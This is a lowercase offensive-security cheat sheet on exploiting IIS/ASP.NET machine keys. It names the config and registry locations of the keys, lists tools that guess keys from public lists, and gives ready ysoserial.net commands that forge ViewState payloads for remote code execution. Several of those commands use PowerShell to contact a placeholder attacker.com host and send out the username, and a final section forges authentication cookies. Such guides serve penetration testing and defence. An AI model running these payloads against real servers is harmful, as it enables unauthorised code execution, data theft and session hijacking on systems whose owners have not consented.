# iis machine keys

> that machine key is used for encryption and decryption of forms authentication cookie data and view-state data, and for verification of out-of-process session state identification.

## summary

* [viewstate format](#viewstate-format)
* [machine key format and locations](#machine-key-format-and-locations)
* [identify known machine key](#identify-known-machine-key)
* [decode viewstate](#decode-viewstate)
* [generate viewstate for rce](#generate-viewstate-for-rce)
    * [mac is not enabled](#mac-is-not-enabled)
    * [mac is enabled and encryption is disabled](#mac-is-enabled-and-encryption-is-disabled)
    * [mac is enabled and encryption is enabled](#mac-is-enabled-and-encryption-is-enabled)
* [edit cookies with the machine key](#edit-cookies-with-the-machine-key)
* [references](#references)


## viewstate format

viewstate in iis is a technique used to retain the state of web controls between postbacks in asp.net applications. it stores data in a hidden field on the page, allowing the page to maintain user input and other state information.

| format | properties |
| --- | --- |
| base64 | `enableviewstatemac=false`,  `viewstateencryptionmode=false` |
| base64 + mac | `enableviewstatemac=true` |
| base64 + encrypted | `viewstateencryptionmode=true` |

by default until sept 2014, the `enableviewstatemac` property was to set to `false`.
usually unencrypted viewstate are starting with the string `/wep`.


## machine key format and locations

a machinekey in iis is a configuration element in asp.net that specifies cryptographic keys and algorithms used for encrypting and validating data, such as view state and forms authentication tokens. it ensures consistency and security across web applications, especially in web farm environments. 

the format of a machinekey is the following.

```xml
<machinekey validationkey="[string]"  decryptionkey="[string]" validation="[sha1 (default) | md5 | 3des | aes | hmacsha256 | hmacsha384 | hmacsha512 | alg:algorithm_name]"  decryption="[auto (default) | des | 3des | aes | alg:algorithm_name]" />
```

the `validationkey` attribute specifies a hexadecimal string used to validate data, ensuring it hasn't been tampered with. 

the `decryptionkey` attribute provides a hexadecimal string used to encrypt and decrypt sensitive data. 

the `validation` attribute defines the algorithm used for data validation, with options like sha1, md5, 3des, aes, and hmacsha256, among others. 

the `decryption` attribute specifies the encryption algorithm, with options like auto, des, 3des, and aes, or you can specify a custom algorithm using alg:algorithm_name.

the following example of a machinekey is from microsoft documentation (https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication).

```xml
<machinekey validationkey="87ac8f432c8db844a4efd024301ac1ab5808bee9d1870689b63794d33ee3b55cdb315bb480721a107187561f388c6bef5b623bf31e2e725fc3f3f71a32ba5dfc" decryptionkey="e001a307ccc8b1adea2c55b1246cdcfe8579576997ff92e7" validation="sha1" />
```

common locations of **web.config** / **machine.config**

* 32-bits
    * `c:\windows\microsoft.net\framework\v2.0.50727\config\machine.config`
    * `c:\windows\microsoft.net\framework\v4.0.30319\config\machine.config`
* 64-bits
    * `c:\windows\microsoft.net\framework64\v4.0.30319\config\machine.config`
    * `c:\windows\microsoft.net\framework64\v2.0.50727\config\machine.config`
* in the registry when **autogenerate** is enabled (extract with https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab)
    * `hkey_current_user\software\microsoft\asp.net\4.0.30319.0\autogenkeyv4`  
    * `hkey_current_user\software\microsoft\asp.net\2.0.50727.0\autogenkey`


## identify known machine key

try multiple machine keys from known products, microsoft documentation, or other part of the internet.

* [isclayton/viewstalker](https://github.com/isclayton/viewstalker)

    ```powershell
    ./viewstalker --viewstate /wepd...tyq== -m 3e92b2d6 -m ./machinekeys2.txt
    ____   ____.__                       __         .__   __
    \   \ /   /|__| ______  _  _________/  |______  |  | |  | __ ___________ 
    \   y   / |  |/ __ \ \/ \/ /  ___/\   __\__  \ |  | |  |/ // __ \_  __ \
    \     /  |  \  ___/\     /\___ \  |  |  / __ \|  |_|    <\  ___/|  | \/
    \___/   |__|\___  >\/\_//____  > |__| (____  /____/__|_ \\___  >__|   
                    \/           \/            \/          \/    \/       

    key found!!!
    host:   
    validation key: xxxxx,xxxxx
    ```

* [blacklanternsecurity/badsecrets](https://github.com/blacklanternsecurity/badsecrets)

    ```ps1
    python examples/blacklist3r.py --viewstate /wepdwuk...j81tyq== --generator 3e92b2d6
    matching machinekeys found!
    validationkey: c50b3c89cb21f4f1422ff158a5b42d0e8db8cb5cda1742572a487d9401e3400267682b202b746511891c1baf47f8d25c07f6c39a104696db51f17c529ad3cabe validationalgo: sha1
    ```

* [notsosecure/blacklist3r](https://github.com/notsosecure/blacklist3r)

    ```powershell
    aspdotnetwrapper.exe --keypath machinekeys.txt --encrypteddata /wepdwukltkymty0mduxmg9kfgicaw8wah4hzw5jdhlwzqutbxvsdglwyxj0l2zvcm0tzgf0ywrkbdrqz4p5effa9gpqkfsqrganwls= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=ca0b0334 --macdecode --legacy
    ```

* [0xacb/viewgen](https://github.com/0xacb/viewgen)

    ```powershell
    $ viewgen --guess "/wepdwukmtyyod...wrkuvmqyhhtcnjl6nfet5erqnhmadi="
    [+] viewstate is not encrypted
    [+] signature algorithm: sha1
    ```

list of interesting machine keys to use:

* [notsosecure/blacklist3r/machinekeys.txt](https://github.com/notsosecure/blacklist3r/raw/f10304bc90efaca56676362a981d93cc312d9087/machinekey/aspdotnetwrapper/aspdotnetwrapper/resource/machinekeys.txt)
* [isclayton/viewstalker/machinekeys2.txt](https://raw.githubusercontent.com/isclayton/viewstalker/main/machinekeys2.txt)
* [blacklanternsecurity/badsecrets/aspnet_machinekeys.txt](https://raw.githubusercontent.com/blacklanternsecurity/badsecrets/dev/badsecrets/resources/aspnet_machinekeys.txt)


## decode viewstate

* [bapp store > viewstate editor](https://portswigger.net/bappstore/ba17d9fb487448b48368c22cb70048dc) - viewstate editor is an extension that allows you to view and edit the structure and contents of v1.1 and v2.0 asp view state data.
* [0xacb/viewgen](https://github.com/0xacb/viewgen)
    ```powershell
    $ viewgen --decode --check --webconfig web.config --modifier ca0b0334 "zuylqfbpwnwhwpqet3ch5prypl94ltupcoc7ujm9jjdlm8v7ng4tlngpewuxly+cdxbwmtoit2hy314li8ypnojualdrfxuk7mgsgldvzsmg/mxn31lcdsianptyuyycdeh27rt6taxzdwupmqjajraduey="
    ```


## generate viewstate for rce

first you need to decode the viewstate to know if the mac and the encryption are enabled. 

**requirements**

* `__viewstate`
* `__viewstategenerator`


### mac is not enabled

```ps1
ysoserial.exe -o base64 -g typeconfusedelegate -f objectstateformatter -c "powershell.exe invoke-webrequest -uri http://attacker.com/:username"
```


### mac is enabled and encryption is disabled

* find the machine key (validationkey) using `badsecrets`, `viewstalker`, `aspdotnetwrapper.exe` or `viewgen` 
    ```ps1
    aspdotnetwrapper.exe --keypath machinekeys.txt --encrypteddata /wepdwukltkymty0mduxmg9kfgicaw8wah4hzw5jdhlwzqutbxvsdglwyxj0l2zvcm0tzgf0ywrkbdrqz4p5effa9gpqkfsqrganwls= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=ca0b0334 --macdecode --legacy
    # --modifier = `__viewstategenerator` parameter value
    # --encrypteddata = `__viewstate` parameter value of the target application
    ```

* then generate a viewstate using [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net), both `textformattingrunproperties` and `typeconfusedelegate` gadgets can be used.
    ```ps1
    .\ysoserial.exe -p viewstate -g textformattingrunproperties -c "powershell.exe invoke-webrequest -uri http://attacker.com/:username" --generator=ca0b0334 --validationalg="sha1" --validationkey="c551753b0325187d1759b4fb055b44f7c5077b016c02af674e8de69351b69fefd045a267308aa2dab81b69919402d7886a6e986473eeec9556a9003357f5ed45"
    .\ysoserial.exe -p viewstate -g typeconfusedelegate -c "powershell.exe -c nslookup http://attacker.com" --generator=3e92b2d6 --validationalg="sha1" --validationkey="c551753b0325187d1759b4fb055b44f7c5077b016c02af674e8de69351b69fefd045a267308aa2dab81b69919402d7886a6e986473eeec9556a9003357f5ed45"

    # --generator = `__viewstategenerator` parameter value
    # --validationkey = validation key from the previous command
    ```


### mac is enabled and encryption is enabled

default validation algorithm is `hmacsha256` and the default decryption algorithm is `aes`.

if the `__viewstategenerator` is missing but the application uses .net framework version 4.0 or below, you can use the root of the app (e.g: `--apppath="/testaspx/"`). 

* **.net framework < 4.5**, asp.net always accepts an unencrypted `__viewstate` if you remove the `__viewstateencrypted` parameter from the request
    ```ps1
    .\ysoserial.exe -p viewstate -g typeconfusedelegate -c "echo 123 > c:\windows\temp\test.txt" --apppath="/testaspx/" --islegacy --validationalg="sha1" --validationkey="70dbadbff4b7a13be67dd0b11b177936f8f3c98bce2e0a4f222f7a769804d451acdb196572fff76106f33dcea1571d061336e68b12cf0af62d56829d2a48f1b0" --isdebug
    ```

* **.net framework > 4.5**, the machinekey has the property: `compatibilitymode="framework45"`
    ```ps1
    .\ysoserial.exe -p viewstate -g textformattingrunproperties -c "echo 123 > c:\windows\temp\test.txt" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --decryptionalg="aes" --decryptionkey="34c69d15add80da4788e6e3d02694230cf8e9adfda2708ef43caef4c5bc73887" --validationalg="hmacsha256" --validationkey="70dbadbff4b7a13be67dd0b11b177936f8f3c98bce2e0a4f222f7a769804d451acdb196572fff76106f33dcea1571d061336e68b12cf0af62d56829d2a48f1b0"
    ```


## edit cookies with the machine key

if you have the `machinekey` but the viewstate is disabled.

asp.net forms authentication cookies : https://github.com/liquidsec/aspnetcrypttools

```powershell
# decrypt cookie
$ aspdotnetwrapper.exe --keypath c:\machinekey.txt --cookie xxxxxxx_xxxxx-xxxxx --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes

# encrypt cookie (edit decrypted.txt)
$ aspdotnetwrapper.exe --decryptdatafilepath c:\decryptedtext.txt
```


## references

* [deep dive into .net viewstate deserialization and its exploitation - swapneil kumar dash - october 22, 2019](https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
* [exploiting deserialisation in asp.net via viewstate - soroush dalili - april 23, 2019](https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [exploiting viewstate deserialization using blacklist3r and ysoserial.net - claranet - june 13, 2019](https://www.claranet.com/us/blog/2019-06-13-exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserialnet)
* [project blacklist3r - @notsosecure - november 23, 2018](https://www.notsosecure.com/project-blacklist3r/)
* [view state, the unpatchable iis forever day being actively exploited - zeroed - july 21, 2024](https://zeroed.tech/blog/viewstate-the-unpatchable-iis-forever-day-being-actively-exploited/)